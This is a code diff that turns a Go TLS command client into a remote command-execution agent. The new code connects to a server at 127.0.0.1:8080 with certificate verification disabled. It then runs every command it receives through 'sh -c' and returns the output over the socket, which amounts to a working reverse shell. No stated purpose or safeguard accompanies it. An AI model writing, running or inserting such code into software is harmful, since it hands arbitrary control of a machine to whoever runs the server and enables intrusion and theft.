@@ -3,46 +3,47 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
+	"encoding/binary"
 	"fmt"
-	"os"
+	"os/exec"
+	"strings"
 )
 
-const serverAddress = "127.0.0.1:9000"
-
 func main() {
-	// Configure TLS (disable verification for self-signed certificates)
+	// Configure TLS client (skip certificate verification)
 	config := &tls.Config{InsecureSkipVerify: true}
-
-	// Connect to the TLS server
-	conn, err := tls.Dial("tcp", serverAddress, config)
+	conn, err := tls.Dial("tcp", "127.0.0.1:8080", config)
 	if err != nil {
-		fmt.Println("Server connection ERROR:", err)
+		fmt.Println("Error connecting to server:", err)
 		return
 	}
 	defer conn.Close()
-
-	fmt.Println("Connected to the TLS server. Please enter command:")
-
-	reader := bufio.NewReader(os.Stdin)
+	fmt.Println("Connected to server via secure connection")
 
 	for {
-		fmt.Print("> ")
-		command, _ := reader.ReadString('\n')
-
-		_, err := conn.Write([]byte(command))
+		command, err := bufio.NewReader(conn).ReadString('\n')
 		if err != nil {
-			fmt.Println("Error sending data:", err)
-			break
+			fmt.Println("Error reading command:", err)
+			return
+		}
+		command = strings.TrimSpace(command)
+
+		fmt.Println("Executing command:", command)
+		cmd := exec.Command("sh", "-c", command)
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			output = append(output, []byte("\nExecution error: "+err.Error())...)
 		}
 
-		// Read server response
-		response := make([]byte, 4096)
-		n, err := conn.Read(response)
-		if err != nil {
-			fmt.Println("Error receiving response:", err)
-			break
-		}
+		// Send output size
+		var length int32 = int32(len(output))
+		binary.Write(conn, binary.LittleEndian, length)
 
-		fmt.Println(string(response[:n]))
+		// Send the actual output
+		_, err = conn.Write(output)
+		if err != nil {
+			fmt.Println("Error sending response:", err)
+			return
+		}
 	}
 }
